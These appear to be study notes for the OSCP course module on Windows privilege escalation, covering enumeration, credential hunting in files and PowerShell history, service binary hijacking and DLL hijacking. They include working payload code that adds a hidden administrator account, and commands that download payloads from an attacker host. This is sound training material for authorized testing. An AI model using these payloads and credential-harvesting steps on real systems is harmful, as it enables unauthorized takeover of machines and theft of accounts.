---
title: "PWK Module 17 - Windows Privilege Escalation"
created: "2026-04-05"
source: "PEN-200 PWK Course (OffSec 2025)"
type: reference-note
status: active
tags:
  - oscp
  - windows
  - privilege-escalation
  - privesc
  - winpeas
  - service-hijacking
  - dll-hijacking
  - pwk
  - reference
  - module-17
---

# Module 17 — Windows Privilege Escalation

> **OSCP Exam Relevance:** Windows PrivEsc is one of the most commonly tested skills on OSCP. You almost always land as a low-privileged user and need to reach SYSTEM or local Administrator. The standard process: enumerate thoroughly → find misconfiguration → exploit → verify. WinPEAS automates discovery; the techniques here explain how to exploit what it finds.

**Learning Units Covered:**
- 17.1 Windows Access Control Concepts (SID, integrity, UAC)
- 17.2 Manual Enumeration (users, groups, system, network, processes, apps)
- 17.3 Sensitive Information in Plain Sight (files, history, transcripts)
- 17.4 Service Binary Hijacking
- 17.5 DLL Hijacking
- 17.6 Automated Enumeration (WinPEAS, PowerUp)

---

## 17.1 Windows Access Control Concepts

Understanding Windows access control is essential for knowing *why* privilege escalation techniques work.

### Security Identifiers (SIDs)

Every user, group, and computer in Windows is identified by a **SID**:
```
S-1-5-21-3623811015-3361044348-30300820-1013
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ domain identifier
                                             ^^^^ RID (Relative ID)
```

**Key RIDs:**
| RID | Account |
|-----|---------|
| 500 | Built-in Administrator |
| 501 | Guest |
| 512 | Domain Admins group |
| 513 | Domain Users group |
| 1000+ | Normal user accounts |

**Well-known SIDs:**
| SID | Meaning |
|-----|---------|
| S-1-1-0 | Everyone |
| S-1-5-11 | Authenticated Users |
| S-1-5-18 | Local SYSTEM |

### Mandatory Integrity Control (MIC) — Integrity Levels

Every process and object in Windows has an **integrity level**. A process can only write to objects at the same or lower integrity level.

| Level | Who | Typical Use |
|-------|-----|-------------|
| System | Kernel/SYSTEM | Core OS processes |
| High | Administrators | Elevated processes (UAC consented) |
| Medium | Standard users | Normal user processes |
| Low | Restricted | Sandboxed apps (browsers, downloads) |

> 💡 **Why this matters for PrivEsc:** Even if your user account *is* in the Administrators group, your shell process may be running at **Medium** integrity. To do admin-level things (like writing to System32), you need a **High integrity** process. UAC bypass techniques elevate from Medium → High without triggering a consent prompt.

### User Account Control (UAC)

UAC works by giving admin users **two tokens**:
1. **Standard user token** — used for most operations (medium integrity)
2. **Administrator token** — only used when you consent to UAC prompt (high integrity)

**For PrivEsc:** Being a member of Administrators ≠ running as admin. You need to either:
- Bypass UAC (elevate without the prompt)
- Find a service/process already running at SYSTEM/High integrity and hijack it

### Access Tokens

- **Primary token** — assigned to a process, defines what it can do
- **Impersonation token** — allows a process to temporarily act as another user (relevant in token impersonation attacks — Potato exploits, etc.)

---

## 17.2 Manual Enumeration

Run these commands immediately after getting a shell. Build a complete picture before choosing an attack path.

### Identity and Group Membership

```cmd
# Who are we?
whoami
whoami /groups     # list all groups and SIDs
whoami /priv       # list all privileges (SeShutdownPrivilege, SeImpersonatePrivilege, etc.)
```

**What to look for in `/groups`:**
- `BUILTIN\Administrators` → already admin (need UAC bypass or already high integrity)
- `NT AUTHORITY\SYSTEM` → SYSTEM level
- Custom groups like `adminteam`, `BackupUsers` → research what they can do
- `BUILTIN\Remote Desktop Users` → can RDP in

```powershell
# Full user and group enumeration in PowerShell
Get-LocalUser                      # all local accounts (check which are enabled)
Get-LocalGroup                     # all local groups (look for interesting ones)
Get-LocalGroupMember Administrators  # who's admin?
Get-LocalGroupMember adminteam       # research custom group memberships
```

**Example output analysis:**
```
Get-LocalGroupMember Administrators
→ Administrator (disabled), BackupAdmin, daveadmin, offsec
```
→ `daveadmin` and `backupadmin` are local admins. If we find their passwords, we can escalate.

### System Information

```cmd
systeminfo
# Key fields:
# OS Name:       Microsoft Windows 11 Pro
# OS Version:    10.0.22621 (Build 22621)
# System Type:   x64-based PC
# Hotfixes:      (missing patches → search for local privilege escalation CVEs)
```

```powershell
# Check architecture specifically
[Environment]::Is64BitOperatingSystem   # True/False
[Environment]::Is64BitProcess           # Is current process 64-bit?
```

> 💡 **Missing hotfixes** → Look for unpatched local privilege escalation exploits. Cross-reference with `searchsploit windows <version>` or the Potato family of exploits.

### Network Information

```cmd
ipconfig /all     # all adapters — look for multiple NICs (pivot opportunity)
route print       # routing table — other networks reachable?
netstat -ano      # active connections and listening ports
                  # -a = all connections, -n = numeric IPs, -o = PID
```

**What to look for in `netstat -ano`:**
- Internal services listening on `127.0.0.1` only (e.g., port 3306 MySQL) → maybe can connect and find credentials
- PIDs of interesting processes → cross-reference with `Get-Process`

### Installed Applications

```powershell
# 32-bit apps (Wow6432Node)
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# 64-bit apps
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

**What to look for:**
- Old/unpatched software (XAMPP, FileZilla, old Office) → searchsploit for known exploits
- Password managers (KeePass) → find the .kdbx file, crack it
- Development tools (VS Code, Git) → may have stored credentials
- Custom internal apps → almost always vulnerable

### Running Processes

```powershell
Get-Process
# Look for: httpd, mysqld, filezilla, custom apps
# Cross-reference with netstat to identify which PID owns which port
```

---

## 17.3 Sensitive Information in Plain Sight

Windows machines are often full of plaintext credentials. Check these locations before trying complex exploits.

### File System Searches

```powershell
# Find password manager databases
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Find config files in XAMPP (common dev stack with hardcoded passwords)
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

# Find sensitive docs in user home directory
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

**Real example — XAMPP my.ini:**
```ini
# backupadmin Windows password for backup job
[client]
password = admin123admin123!
```
→ Comment in a config file revealed a Windows account password!

**Real example — asdf.txt on Desktop:**
```
Steve (the guy with long shirt) gives us his password for testing
password is: securityIsNotAnOption++++++
```
→ Notes files left on desktops frequently contain credentials.

### PowerShell Command History

PowerShell saves command history via **PSReadLine** — a goldmine for credentials typed in previous sessions.

```powershell
# Find where history is saved
(Get-PSReadlineOption).HistorySavePath
# C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Read history
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Example history hit:**
```powershell
Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
```
→ Plaintext password passed to a KeePass secret vault command!

```powershell
# Also check for transcripts (full session recordings)
type C:\Users\Public\Transcripts\transcript01.txt
```

**Example transcript hit:**
```powershell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```
→ Full credential for `daveadmin` in a transcript file!

### Using Found Credentials

Once you have credentials, escalate:

```powershell
# Option 1: runas (spawns new cmd as that user)
runas /user:backupadmin cmd
# Enter the password when prompted

# Option 2: evil-winrm (full interactive shell via WinRM, port 5985)
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123!!"

# Option 3: PowerShell remoting
$password = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("USERNAME", $password)
Enter-PSSession -ComputerName TARGET -Credential $cred
```

> 💡 **Prefer evil-winrm over Enter-PSSession** in a bind/reverse shell context. PSRemoting has limitations in non-interactive sessions; evil-winrm handles this better.

---

## 17.4 Service Binary Hijacking

### Why This Works

Windows services run executables. If a service runs as `LocalSystem` (SYSTEM privileges) but the **binary file itself is writable by a low-privileged user**, we can replace that binary with our own payload. When the service starts/restarts, our code runs as SYSTEM.

### Step 1 — Find Services with Writable Binaries

```powershell
# List all running services and their binary paths
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

```powershell
# Check permissions on a specific binary
icacls "C:\xampp\apache\bin\httpd.exe"
# BUILTIN\Users:(RX)   ← Read/Execute only — NOT exploitable

icacls "C:\xampp\mysql\bin\mysqld.exe"
# BUILTIN\Users:(F)    ← Full Access — EXPLOITABLE!
```

**Permission mask reference:**
| Mask | Permission |
|------|-----------|
| F | Full access (read/write/execute/delete) |
| M | Modify (read/write/execute, no delete/permission change) |
| RX | Read and Execute |
| R | Read only |
| W | Write only |

> 💡 **What you need:** `(F)` or `(M)` for the `Users` group or your specific user to exploit a service binary.

### Step 2 — Create the Payload Binary

```c
// adduser.c — creates a new admin user when executed
#include <stdlib.h>

int main() {
    int i;
    i = system("net user dave2 password123! /add");
    i = system("net localgroup administrators dave2 /add");
    return 0;
}
```

```bash
# Cross-compile on Kali for 64-bit Windows target
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

### Step 3 — Replace the Service Binary

```powershell
# Serve the payload from Kali
python3 -m http.server 80

# On target: download payload
iwr -uri http://KALI_IP/adduser.exe -Outfile adduser.exe

# Back up original (important for cleanup!)
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

# Replace with payload
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

### Step 4 — Trigger Execution

```powershell
# Try stopping/starting service
net stop mysql && net start mysql
# May fail: "Access is denied" — no service control rights

# Check startup type
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'mysql'}
# StartMode: Auto → will start on reboot

# Check if we have SeShutdownPrivilege
whoami /priv
# SeShutdownPrivilege: Disabled → still usable, just need to enable it

# Reboot to trigger service restart
shutdown /r /t 0
```

### Step 5 — Verify and Connect

```powershell
# After reboot, reconnect and verify new admin user exists
Get-LocalGroupMember administrators
# → dave2 now in Administrators group!

# Connect as dave2
runas /user:dave2 cmd
# or via evil-winrm if WinRM is enabled
```

### Automation: PowerUp.ps1

```powershell
# On Kali
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80

# On target
iwr -uri http://KALI_IP/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass          # bypass execution policy
. .\PowerUp.ps1               # import module

Get-ModifiableServiceFile      # finds writable service binaries automatically
# Output:
# ServiceName: mysql
# ModifiableFile: C:\xampp\mysql\bin\mysqld.exe
# AbuseFunction: Install-ServiceBinary -Name 'mysql'
```

> ⚠️ `Install-ServiceBinary` may fail with argument paths — use manual replacement if automation fails.

---

## 17.5 DLL Hijacking

### Why This Works

When Windows loads a DLL for an application, it searches for it in a **specific order** of directories:
1. The application's own directory
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. Directories in the `%PATH%` environment variable

If an application tries to load a DLL that **doesn't exist**, it searches through all these directories and fails silently. If we can **write a malicious DLL with the same name** into the application's directory (which is searched first), our DLL loads instead.

### Step 1 — Identify a Vulnerable Application

Research installed software for known DLL hijacking vulnerabilities.

**Example:** FileZilla FTP Client has a documented vulnerability where it looks for `TextShaping.dll` in its own directory first, but the DLL isn't there by default.

```powershell
# Verify we can write to FileZilla's directory
echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
type 'C:\FileZilla\FileZilla FTP Client\test.txt'
# Output: test  → write access confirmed
```

### Step 2 — Confirm Missing DLL with Process Monitor

**Process Monitor (Procmon)** from Sysinternals captures all file/registry/process activity in real-time.

1. Run Procmon as a high-integrity user (backupadmin in this case)
2. Set filters: **Path contains** `TextShaping.dll` → AND **Result is** `NAME NOT FOUND`
3. Start FileZilla → observe it searching for `TextShaping.dll` → `NAME NOT FOUND` in the app directory
4. Confirm that the app directory is the first search path → we can plant our DLL there

### Step 3 — Create the Malicious DLL

```cpp
// TextShaping.cpp — DLL that adds an admin user on load
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            int i;
            i = system("net user dave3 password123! /add");
            i = system("net localgroup administrators dave3 /add");
            break;
    }
    return TRUE;
}
```

**`DLL_PROCESS_ATTACH`** runs when the DLL is first loaded into a process — this is when our payload executes.

```bash
# Compile as a shared library (DLL) on Kali
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

### Step 4 — Deploy and Trigger

```powershell
# Download DLL to FileZilla's directory on target
iwr -uri http://KALI_IP/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
```

> ⚠️ **Critical:** The DLL runs with the **privileges of the process that loads it**. If FileZilla is started as SYSTEM or a high-privilege user, our code runs at that level. If it starts as `steve` (a normal user), the `net localgroup administrators` command will fail. DLL hijacking only escalates privileges if the target process runs at a higher privilege level than you.

In this scenario, `backupadmin` (an administrator) is expected to start FileZilla — so the DLL runs as admin.

---

## 17.6 Automated Enumeration

### WinPEAS

WinPEAS automates enumeration and highlights privesc opportunities in colour-coded output.

```powershell
# On Kali
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80

# On target
iwr -uri http://KALI_IP/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```

**Key sections to review in WinPEAS output:**
- **Basic System Information** — OS version + build → check for unpatched CVEs
- **Current User Privileges** — `SeImpersonatePrivilege` → Potato attacks
- **NTLM Settings** — LM hash authentication → pass-the-hash opportunities
- **Transcripts History** — auto-finds PSReadLine history
- **Users** — enabled accounts, group memberships
- **Services** — writable binaries and configs
- **Credentials** — registry, files, scheduled tasks with embedded creds

---

## Windows PrivEsc Decision Tree

```
Got a shell as low-priv user?
    ↓
Run: whoami /groups, whoami /priv
    ↓
Already in Administrators? → Need UAC bypass → Use UAC bypass techniques
    ↓
SeImpersonatePrivilege? → Potato attack (PrintSpoofer, GodPotato, JuicyPotato)
    ↓
Run WinPEAS → review output
    ↓
Writable service binary? → Service Binary Hijacking
    ↓
App with missing DLL + writable dir? → DLL Hijacking
    ↓
Interesting files? → Check history, transcripts, .ini, .txt, .kdbx
    ↓
Unpatched OS? → searchsploit "windows <version>" → local exploit
    ↓
Scheduled task with writable script? → Replace script
```

---

## Quick Reference — All Commands

```powershell
# Identity
whoami; whoami /groups; whoami /priv

# Users & groups
Get-LocalUser; Get-LocalGroup
Get-LocalGroupMember Administrators

# System
systeminfo

# Network
ipconfig /all; route print; netstat -ano

# Installed apps
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Processes
Get-Process

# File searches
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\%USERNAME%\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

# History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls "C:\path\to\service.exe"
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'mysql'}

# Privileges
whoami /priv
shutdown /r /t 0

# Lateral movement with found creds
runas /user:USERNAME cmd
evil-winrm -i TARGET_IP -u USERNAME -p "PASSWORD"
```

---

## Connections

- [[PWK-Module-16-Password-Attacks]] — crack hashes/KeePass databases found during enumeration
- [[PWK-Module-18-Linux-PrivEsc]] — Linux equivalent; compare the methodologies
- [[Windows-PrivEsc-Decision-Tree]] — permanent note on the attack selection logic
- [[OSCP-Certification-Sprint]] — parent project

## External Resources

- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- [PayloadsAllTheThings - Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [HackTricks - Windows Local PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PrintSpoofer / GodPotato](https://github.com/BeichenDream/GodPotato) — SeImpersonatePrivilege exploitation
- [IppSec](https://www.youtube.com/@ippsec) — search any Windows box for PrivEsc workflow

---

## Practice Labs

| Room / Machine | Platform | What it practices |
|----------------|----------|-------------------|
| [Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20) | TryHackMe | Comprehensive guide: service misconfigs, AlwaysInstallElevated, scheduled tasks, credential harvesting from IIS/PuTTY/PowerShell history |
| [Steel Mountain](https://tryhackme.com/room/steelmountain) | TryHackMe | Rejetto HFS exploit (CVE-2014-6287) → unquoted service path / insecure service binary for PrivEsc |
| [Alfred](https://tryhackme.com/room/alfred) | TryHackMe | Jenkins exploit → Meterpreter → token impersonation (incognito) → SYSTEM |
| [Internal](https://tryhackme.com/room/internal) | TryHackMe | WordPress exploit → Jenkins on internal port → SSH privkey → root (full internal pentest) |
